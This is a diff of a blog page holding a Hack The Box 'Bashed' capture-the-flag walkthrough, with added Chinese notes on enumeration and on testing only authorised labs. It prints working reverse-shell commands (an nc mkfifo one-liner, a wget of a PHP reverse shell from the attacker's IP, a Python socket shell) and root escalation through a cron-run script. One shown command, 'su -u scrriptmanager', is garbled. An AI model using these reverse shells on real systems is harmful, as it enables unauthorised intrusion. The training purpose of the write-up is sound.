@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-cn">
 <head>
 
   <meta charset="utf-8" />
@@ -211,7 +211,9 @@
       <h1 class="post-title">Bashed -- hack the box</h1>
       <p class="post-meta">@Neal · Apr 4, 2019 · 9 min read</p>
     </header>
-    <article class="post-content"><p><a href="https://imgchr.com/i/AgdMvj"><img src="https://s2.ax1x.com/2019/04/03/AgdMvj.md.png" alt="AgdMvj.md.png"></a></p>
+    <article class="post-content"><blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <h2 id="introduction">Introduction</h2>
 <p>Target: 10.10.10.68 (OS: Linux)</p>
 <p>Kali linux: 10.10.16.44</p>
@@ -238,25 +240,39 @@ PORT   STATE SERVICE VERSION
 <h2 id="exploit">Exploit</h2>
 <h3 id="http">Http</h3>
 <p>Access to <code>http://10.10.10.68</code>, and it seems to be a simple blog which talks about <code>phpbash</code>.</p>
-<p><img src="https://s2.ax1x.com/2019/04/04/AgfJCd.png" alt="AgfJCd.png"></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <p><code>phpbash</code> seems to be a webshell tool. And there is a github repository <a href="https://github.com/Arrexel/phpbash">phpbash</a> introduces the tool. The introduction of the repo is to drop the file to target and access it by <code>http://ip/uploads/phpbash.php</code>. Try to access <code>http://10.10.10.68/uploads/phpbash.php</code>. But the file seems not to be here.</p>
 <p>Utilize the dirbuster to enumerate the directories.</p>
-<p><img src="https://s2.ax1x.com/2019/04/04/AgfTPJ.png" alt="AgfTPJ.png"></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <p>Wow. Find it and open the file <code>phpbash.php</code>. Here is the webshell. I have tried to reverse shell by <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.44 1234 &gt;/tmp/f</code>. But the shell cannot be returned. Whatever, I can obtain the user.txt.</p>
-<p><img src="https://s2.ax1x.com/2019/04/04/AghFMt.png" alt="AghFMt.png"></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <p>It is convenient to get the reverse shell. So I try to upload a php shell to the target machine. The detailed php script can be found <a href="https://github.com/neal1991/htb/blob/master/Bashed/php-reverse-shell.php">here</a>. And I server the php script by <code>python -m SimpleHTTPServer 80</code>. Then download the php script from the target machine. To ensure the script can be written to the target machine. Select a path can be written, for example: <code>/tmp</code>.</p>
-<p><a href="https://imgchr.com/i/AghBsx"><img src="https://s2.ax1x.com/2019/04/04/AghBsx.png" alt="AghBsx.png"></a></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <p><code>wget http://10.10.16.44/php-reverse-shell.php</code></p>
 <p>Then in the kali, set the <code>nc</code> listen to port 1234:</p>
 <p><code>nc -lvnp 1234</code></p>
 <p>Execute the php script in the target machine <code>php php-reverse-shell.php</code>. OK. We obtain the reverse shell.</p>
-<p><a href="https://imgchr.com/i/AghhQI"><img src="https://s2.ax1x.com/2019/04/04/AghhQI.png" alt="AghhQI.png"></a></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <h2 id="privilege-escalation">Privilege escalation</h2>
 <p>Obtain the user permission is quite easy, and it is not difficult to obtain the root permission. Utilize <code>sudo -l</code> to see the permissions of the user. Something interesting found. We can switch to <code>scriptmanager</code> user without password.</p>
-<p><img src="https://s2.ax1x.com/2019/04/04/Ag4cn0.png" alt="Ag4cn0.png"></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <pre tabindex="0"><code>su -u scrriptmanager bash -i
 </code></pre><p>Try to enumerate the files. And I find an interesting folder inside <code>/scripts</code>. There are two files <code>test.py</code> and <code>test.txt</code>. Try to display the content of <code>test.py</code>.</p>
-<p><a href="https://imgchr.com/i/AghxO0"><img src="https://s2.ax1x.com/2019/04/04/AghxO0.png" alt="AghxO0.png"></a></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <p>The python script is quite straightforward. It just writes <code>testing 123!</code> to the file <code>test.txt</code>. And if we see the attributes of <code>test.txt</code>, the modified time of the file changes each minute. And the file is owned by root. It seems that <code>root</code> will execute the python scripts in <code>/scripts</code> folder each minute. So utilize a python script to reverse the root shell(according to the information above, the python version of the target machine is 2.7):</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span>subprocess<span style="color:#f92672">,</span>os;
 </span></span><span style="display:flex;"><span>s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM);
@@ -266,8 +282,37 @@ PORT   STATE SERVICE VERSION
 </span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>);
 </span></span><span style="display:flex;"><span>p<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>call([<span style="color:#e6db74">&#34;/bin/sh&#34;</span>,<span style="color:#e6db74">&#34;-i&#34;</span>]);
 </span></span></code></pre></div><p>Set the kali listen to port 4444. Download the python script in the target machine and execute. Now, root shell is obtained.</p>
-<p><img src="https://s2.ax1x.com/2019/04/04/AgICRJ.png" alt="AgICRJ.png"></p>
-<p><a href="https://imgchr.com/i/AgIks1"><img src="https://s2.ax1x.com/2019/04/04/AgIks1.png" alt="AgIks1.png"></a></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
+<h2 id="练习要点">练习要点</h2>
+<p>Bashed 一类箱子常强调：</p>
+<ul>
+<li>Web 目录下的意外脚本/webshell 入口</li>
+<li>低权限用户横向到更高组</li>
+<li>本机枚举（sudo、SUID、定时任务）</li>
+</ul>
+<h2 id="writeup-规范">Writeup 规范</h2>
+<ol>
+<li>只记录授权靶场过程</li>
+<li>截图失效时以命令输出代替</li>
+<li>总结「哪一步枚举本可更快发现」</li>
+</ol>
+<h2 id="小结">小结</h2>
+<p>初始访问往往藏在「看起来无关」的虚拟主机或脚本目录里。提权前把用户与组关系画清楚，能少走弯路。</p>
+<h2 id="枚举清单可复用">枚举清单（可复用）</h2>
+<ol>
+<li>全端口与版本探测</li>
+<li>HTTP 标题、技术栈、目录字典</li>
+<li>可能的虚拟主机</li>
+<li>默认口令与公开 exploit 检索</li>
+<li>低权 shell 后：<code>id</code>、<code>sudo -l</code>、定时任务、SUID、内核</li>
+</ol>
+<p>每一步记下「排除了什么」，writeup 才有复盘价值。靶场通关后花 10 分钟整理思维导图，下次同类盒子会显著更快。</p>
+<h2 id="延伸阅读与实践">延伸阅读与实践</h2>
+<p>把文章里的命令和配置放到自己的实验环境跑一遍，比只看结论更重要。建议同步记录：环境版本、失败现象、最终生效的配置。下次遇到同类问题时，检索自己的笔记往往比搜引擎更快。</p>
+<p>若该主题涉及安全测试，请仅在明确授权的系统或官方靶场中操作，并保留测试范围与时间窗记录，避免对生产造成误伤。</p>
+<p>对团队分享时，用「问题—影响—修复—验证」四段结构复述，有助于把个人经验沉淀为组织能力。</p>
 </article>
     <footer class="post-footer">
       
@@ -282,7 +327,7 @@ PORT   STATE SERVICE VERSION
       </ul>
       
       <p class="post-copyright">
-        This post was published <strong>2683</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+        
       </p>
     </footer>
     
